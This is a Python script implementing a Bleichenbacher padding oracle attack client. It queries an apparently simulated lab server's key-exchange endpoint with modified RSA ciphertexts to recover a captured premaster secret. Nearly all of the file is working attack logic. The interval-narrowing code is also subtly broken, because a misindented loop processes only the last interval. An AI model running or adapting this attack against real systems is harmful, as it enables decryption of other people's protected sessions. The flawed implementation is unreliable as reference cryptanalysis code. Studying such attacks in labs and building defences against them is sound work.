#!/usr/bin/env python3
"""
Bleichenbacher Attack Client
Implements a TLS client with Bleichenbacher padding oracle attack capabilities.
"""

import sys
import time
from typing import Any, Dict, List, Optional, Tuple

import requests
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization


class BleichenbacherClient:
    """
    A TLS client that performs Bleichenbacher padding oracle attack.

    The Bleichenbacher attack exploits RSA PKCS#1 v1.5 padding in TLS
    to decrypt chosen ciphertexts by using the server as a padding oracle.

    Attributes:
        server_host: Server hostname/IP address
        server_port: Server port number
        base_url: Constructed base URL for API calls
        session: Requests session for connection reuse
        server_public_key: Server's public key obtained during handshake
        cipher_suite: Selected cipher suite (RSA with PKCS#1 v1.5 padding)
    """

    def __init__(self, server_host: str, server_port: int):
        """
        Initialize the Bleichenbacher attack client.

        Args:
            server_host: Target server hostname or IP address
            server_port: Target server port number
        """
        self.server_host = server_host
        self.server_port = server_port
        self.base_url = f"http://{server_host}:{server_port}"
        self.session = requests.Session()
        self.server_public_key = None
        self.cipher_suite = "TLS_RSA_WITH_AES_128_CBC_SHA"  # Vulnerable to Bleichenbacher
        self.client_random = None
        self.server_random = None
        self.premaster_secret = None

    def perform_handshake(self) -> bool:
        """
        Perform minimal handshake to get server's public key.

        Returns:
            True if handshake successful, False otherwise
        """
        try:
            self.receive_certificate()
            return True
        except Exception as e:
            print(f"Handshake failed: {e}")
            return False

    def receive_certificate(self) -> Dict[str, Any]:
        """
        Receive server's certificate and extract public key.

        Returns:
            Certificate data including server's RSA public key
        """
        response = self.session.get(f"{self.base_url}/certificate")
        data = response.json()
        public_key_pem = data.get("public_key")

        # Load the public key from PEM format
        self.server_public_key = serialization.load_pem_public_key(
            public_key_pem.encode('utf-8'),
            backend=default_backend()
        )
        return data

    def simulate_captured_message(self) -> bytes:
        """
        Simulate capturing an encrypted premaster secret from a ClientKeyExchange.

        Returns:
            Captured encrypted premaster secret (ciphertext)
        """
        response = self.session.get(f"{self.base_url}/captured-message")
        ciphertext_hex = response.json().get("encrypted_message")
        return bytes.fromhex(ciphertext_hex)

    def send_client_key_exchange(self, encrypted_pms: Optional[bytes] = None) -> Dict[str, Any]:
        """
        Send ClientKeyExchange with encrypted premaster secret.

        This is the critical step for Bleichenbacher attack where the
        premaster secret is encrypted with server's public key using
        RSA PKCS#1 v1.5 padding.

        Args:
            encrypted_pms: Optional pre-encrypted premaster secret
                          (used for attack with modified ciphertexts)

        Returns:
            Server acknowledgment
        """
        payload = {
            "encrypted_premaster_secret": encrypted_pms.hex()
        }
        response = self.session.post(
            f"{self.base_url}/client-key-exchange", json=payload)
        return response.json()

    # Bleichenbacher Attack Methods
    def execute_bleichenbacher_attack(self, ciphertext: bytes) -> Optional[bytes]:
        """
        Execute Bleichenbacher padding oracle attack to decrypt ciphertext.

        The attack works by:
        1. Oracle queries: Send modified ciphertexts to check padding validity
        2. Narrowing intervals: Use oracle responses to narrow plaintext range
        3. Recovery: Iteratively recover plaintext message

        Args:
            ciphertext: The encrypted premaster secret to decrypt

        Returns:
            Decrypted plaintext if successful, None otherwise
        """
        print(
            f"[*] Starting Bleichenbacher attack w/ {self.cipher_suite} cipher suite")

        # Start the full attack
        return self._narrow_solution_space(ciphertext, s0=1)

    def _find_next_s(self, c: int, s_prev: int, M: List[Tuple[int, int]], n: int, e: int, k: int, B: int, iteration: int, start_time: float, oracle_queries: int) -> Tuple[Optional[int], int]:
        """
        Find the next s value that produces PKCS#1 v1.5 conformant message.

        Implements Bleichenbacher Step 2b (single interval) and 2c (multiple intervals).

        Args:
            c: Ciphertext as integer
            s_prev: Previous s value
            M: Current set of intervals
            n: RSA modulus
            e: RSA public exponent
            k: Key size in bytes
            B: Bound value (2^(8*(k-2)))
            iteration: Current iteration number
            start_time: Attack start timestamp
            oracle_queries: Total queries made so far

        Returns:
            Tuple of (next s value or None, number of queries used)
        """
        queries_used = 0

        # Step 2b: Searching with one interval (more efficient)
        if len(M) == 1:
            a, b = M[0]
            # Calculate a better starting point based on the interval
            r = (2 * (b * s_prev - 2 * B) + n - 1) // n  # ceiling division

            while True:
                # Calculate s range for this r
                s_min = (2 * B + r * n + b - 1) // b  # ceiling division
                s_max = (3 * B - 1 + r * n) // a  # floor division

                # Search through this range
                for s in range(max(s_min, s_prev + 1), s_max + 1):
                    queries_used += 1
                    total_queries = oracle_queries + queries_used

                    # Update progress every 10 queries
                    if queries_used % 10 == 0:
                        elapsed = time.time() - start_time
                        qps = total_queries / elapsed if elapsed > 0 else 0
                        width = b - a
                        width_bits = width.bit_length()
                        # Format s to prevent overflow (show first 10 and last 10 digits)
                        s_str = str(s)
                        s_display = f"{s_str[:10]}...{s_str[-10:]}" if len(
                            s_str) > 20 else s_str
                        sys.stdout.write(
                            f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:>6.1f} q/s | Width: 2^{width_bits:<4} | Elapsed: {int(elapsed):>6}s | s={s_display:<23}" + " " * 10)
                        sys.stdout.flush()

                    # Test if this s value produces conforming message
                    if self._test_s_value(c, s, e, n, k):
                        elapsed = time.time() - start_time
                        qps = total_queries / elapsed if elapsed > 0 else 0
                        width = b - a
                        width_bits = width.bit_length()
                        # Format s to prevent overflow (show first 10 and last 10 digits)
                        s_str = str(s)
                        s_display = f"{s_str[:10]}...{s_str[-10:]}" if len(
                            s_str) > 20 else s_str
                        sys.stdout.write(
                            f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:>6.1f} q/s | Width: 2^{width_bits:<4} | Elapsed: {int(elapsed):>6}s | s={s_display:<23}" + " " * 10)
                        sys.stdout.flush()
                        return s, queries_used

                # Move to next r value
                r += 1

        # Step 2c: Searching with multiple intervals (original linear search)
        else:
            s = s_prev + 1

            while True:
                queries_used += 1
                total_queries = oracle_queries + queries_used

                # Update progress every 10 queries
                if queries_used % 10 == 0:
                    elapsed = time.time() - start_time
                    qps = total_queries / elapsed if elapsed > 0 else 0
                    # Format s to prevent overflow (show first 10 and last 10 digits)
                    s_str = str(s)
                    s_display = f"{s_str[:10]}...{s_str[-10:]}" if len(
                        s_str) > 20 else s_str
                    sys.stdout.write(
                        f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:>6.1f} q/s | Width: {'N/A':<8} | Elapsed: {int(elapsed):>6}s | s={s_display:<23}" + " " * 10)
                    sys.stdout.flush()

                # Test if this s value produces conforming message
                if self._test_s_value(c, s, e, n, k):
                    elapsed = time.time() - start_time
                    qps = total_queries / elapsed if elapsed > 0 else 0
                    # Format s to prevent overflow (show first 10 and last 10 digits)
                    s_str = str(s)
                    s_display = f"{s_str[:10]}...{s_str[-10:]}" if len(
                        s_str) > 20 else s_str
                    sys.stdout.write(
                        f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:>6.1f} q/s | Width: {'N/A':<8} | Elapsed: {int(elapsed):>6}s | s={s_display:<23}" + " " * 10)
                    sys.stdout.flush()
                    return s, queries_used

                s += 1

    def _narrow_solution_space(self, ciphertext: bytes, s0: int) -> Optional[bytes]:
        """
        Iteratively narrow the solution space using oracle queries.

        Args:
            ciphertext: Ciphertext
            s0: Initial s value

        Returns:
            Recovered plaintext or None
        """
        # Get RSA public key parameters
        public_numbers = self.server_public_key.public_numbers()
        n = public_numbers.n
        e = public_numbers.e
        k = (n.bit_length() + 7) // 8
        B = 2 ** (8 * (k - 2))          # Boundary value

        # Convert ciphertext to integer
        c = int.from_bytes(ciphertext, byteorder='big')

        # Initialize intervals [a, b]
        # M_0 = {[2B, 3B - 1]}
        intervals = [(2 * B, 3 * B - 1)]
        s = s0

        print("[*] Starting interval narrowing (Bleichenbacher Step 2)")
        print("[*] Initial interval: [2B, 3B-1] where B = 2^(8*(k-2))")
        print("[*] Starting full-scale attack (this may take a while)...\n")

        oracle_queries = 1  # Already did one query to verify conformance
        start_time = time.time()
        iteration = 0

        # Continue until we narrow down to a single value
        try:
            while True:
                iteration += 1

                # Calculate progress metrics
                elapsed = time.time() - start_time
                qps = oracle_queries / elapsed if elapsed > 0 else 0

                # Calculate interval width for progress tracking
                if len(intervals) == 1:
                    interval_width = intervals[0][1] - intervals[0][0]
                    width_bits = interval_width.bit_length()
                    width_str = f"2^{width_bits:<4}"
                else:
                    width_str = "N/A"

                # Format s to prevent overflow (show first 10 and last 10 digits)
                s_str = str(s)
                s_display = f"{s_str[:10]}...{s_str[-10:]}" if len(
                    s_str) > 20 else s_str
                sys.stdout.write(
                    f"\r[*] Iteration: {iteration:<5} | Queries: {oracle_queries:<8} | Rate: {qps:>6.1f} q/s | Width: {width_str:<8} | Elapsed: {int(elapsed):>6}s | s={s_display:<23}" + " " * 10)
                sys.stdout.flush()

                # Step 2.c/3: Narrow the set of solutions based on current s
                new_intervals = []
                for a, b in intervals:
                    # Calculate r_min and r_max
                    # ceiling division
                    r_min = (a * s - 3 * B + 1 + n - 1) // n
                    r_max = (b * s - 2 * B) // n  # floor division

                for r in range(r_min, r_max + 1):
                    # Calculate new interval bounds
                    new_a = max(a, (2 * B + r * n + s - 1) // s)
                    new_b = min(b, (3 * B - 1 + r * n) // s)

                    if new_a <= new_b:
                        new_intervals.append((new_a, new_b))

                # Merge overlapping intervals
                intervals = self._merge_intervals(new_intervals)

                if not intervals:
                    print("\n[-] No valid intervals remaining")
                    break

                # Check if we have narrowed down to a single value
                if len(intervals) == 1 and intervals[0][0] == intervals[0][1]:
                    plaintext_int = intervals[0][0]
                    elapsed = time.time() - start_time
                    print(
                        "\n\n[+] Attack successful! Narrowed to single value!")
                    print(f"[+] Total iterations: {iteration}")
                    print(f"[+] Total oracle queries: {oracle_queries}")
                    print(
                        f"[+] Total time: {elapsed:.2f}s ({oracle_queries/elapsed:.1f} queries/sec)")

                    try:
                        plaintext = plaintext_int.to_bytes(k, byteorder='big')
                        print(
                            f"[+] Decrypted plaintext (hex): {plaintext.hex()}")
                        # Try to extract the actual message (after 0x00 0x02 padding)
                        try:
                            # Find the 0x00 separator after padding
                            sep_index = plaintext.index(b'\x00', 2)
                            message = plaintext[sep_index+1:]
                            print(f"[+] Extracted message: {message}")
                            return message
                        except:
                            return plaintext
                    except (ValueError, OverflowError) as e:
                        print(f"\n[-] Error converting to bytes: {e}")
                        return None

                # Step 2: Find next s value
                next_s, queries_used = self._find_next_s(
                    c, s, intervals, n, e, k, B, iteration, start_time, oracle_queries)
                if next_s is None:
                    print("\n[-] Could not find next s value")
                    break

                oracle_queries += queries_used
                s = next_s
        except KeyboardInterrupt:
            print("\n\n[!] Attack interrupted by user")
            return None

        return None

    def _merge_intervals(self, intervals: List[Tuple[int, int]]) -> List[Tuple[int, int]]:
        """
        Merge overlapping intervals.

        Args:
            intervals: List of (a, b) tuples

        Returns:
            Merged list of intervals
        """
        if not intervals:
            return []

        sorted_intervals = sorted(intervals)
        merged = [sorted_intervals[0]]

        for current in sorted_intervals[1:]:
            last = merged[-1]
            if current[0] <= last[1] + 1:
                # Overlapping or adjacent intervals
                merged[-1] = (last[0], max(last[1], current[1]))
            else:
                merged.append(current)

        return merged

    def _test_s_value(self, c: int, s: int, e: int, n: int, k: int) -> bool:
        """
        Test if an s value produces a PKCS-conforming message.

        Args:
            c: Ciphertext as integer
            s: Multiplier value to test
            e: Public exponent
            n: Modulus
            k: Key size in bytes

        Returns:
            True if PKCS-conforming, False otherwise
        """
        modified_c = (c * pow(s, e, n)) % n
        modified_ciphertext = modified_c.to_bytes(k, byteorder='big')
        return self.padding_oracle_query(modified_ciphertext)

    def padding_oracle_query(self, modified_ciphertext: bytes) -> bool:
        """
        Query the server to check if ciphertext has valid PKCS#1 v1.5 padding.

        This is the core oracle function. The server's response (error message,
        timing, or behavior) reveals whether the padding is valid.

        Args:
            modified_ciphertext: Modified ciphertext to test

        Returns:
            True if padding is valid, False otherwise
        """
        try:
            response = self.send_client_key_exchange(modified_ciphertext)
            return self._is_padding_valid(response)
        except Exception as e:
            return False

    def _is_padding_valid(self, response: Dict[str, Any]) -> bool:
        """
        Determine if padding is valid based on server response.

        Args:
            response: Server response to analyze

        Returns:
            True if padding appears valid, False otherwise
        """
        # Check if the response indicates successful decryption
        # Valid padding returns "client_key_exchange_received"
        # Invalid padding returns "error"
        if isinstance(response, dict):
            status = response.get('status')
            return status == 'client_key_exchange_received'
        return False

    def health_check(self) -> bool:
        """
        Check if server is reachable and responding.

        Returns:
            True if server is healthy, False otherwise
        """
        try:
            response = self.session.get(f"{self.base_url}/health", timeout=5)
            return response.status_code == 200
        except Exception as e:
            print(f"Health check failed: {e}")
            return False


if __name__ == "__main__":
    # Example usage
    client = BleichenbacherClient(server_host="localhost", server_port=7265)

    # Check server health
    if client.health_check():
        print("[+] Server is reachable")

        # Perform handshake
        if client.perform_handshake():
            print("[+] Handshake successful")
            target_ciphertext = client.simulate_captured_message()
            decrypted_plaintext = client.execute_bleichenbacher_attack(
                target_ciphertext)
            if decrypted_plaintext:
                print(
                    f"[+] Attack successful! Recovered plaintext: {decrypted_plaintext}")
            else:
                print("[-] Attack failed to recover plaintext")
        else:
            print("[-] Handshake failed")
    else:
        print("[-] Server is not reachable")
